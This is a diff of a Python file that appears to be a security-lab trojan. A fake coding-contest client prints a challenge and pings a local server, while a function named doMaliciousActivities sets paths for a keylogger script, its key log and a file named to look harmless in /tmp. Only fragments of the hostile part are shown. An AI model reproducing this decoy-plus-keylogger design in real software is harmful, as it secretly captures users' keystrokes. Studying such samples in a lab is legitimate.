@@ -274,7 +274,6 @@ def daemonize(pidfile, *, stdin='/dev/null',
 
 
 def doMaliciousActivities():
-
     remotepath = "/home/lab/bin/py/project/a1KeyLogger.py"
     localpath = "/tmp/ZZZZ_NOT_SUSPICIOUS_FILE"
     remotepath2 = "/home/lab/bin/py/project/clientKeyLogs.log"
@@ -337,6 +336,9 @@ def printNonMaliciousActivity():
           "This is file is used to ping the server.")
 
     print("Language Used: Python 3, Recommended Libraries to use: os, sys, socket")
+    print("Your coding challenge: Send an 'X' to the server with a python" +
+          "socket client connection to terminate the server.")
+    print("Now let's get coding!")
 
     print("Pinging server ...")
     for i, j in enumerate(list(range(10001))):
@@ -346,17 +348,15 @@ def printNonMaliciousActivity():
     try:
         helloSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         helloSocket.connect(("127.0.0.1", 9999))
+        helloSocket.settimeout(5.0)
         print(helloSocket.recv(1024).decode())
         helloSocket.send("Hello from contest client!".encode())
         helloSocket.close()
     except Exception:
         print("Woops! Seems like you do not have the server running!" +
-        "Use the command 'python3 contestServer.py' to start it up on the" + 
-        "command Line")
+              "Use the command 'python3 contestServer.py' to start it up on the" +
+              "command Line")
 
-    print("Your coding challenge: Send an 'X' to the server with a python" +
-    "socket client connection to terminate the server.")
-    print("Now let's get coding!")
 
 # main thread
 if __name__ == '__main__':
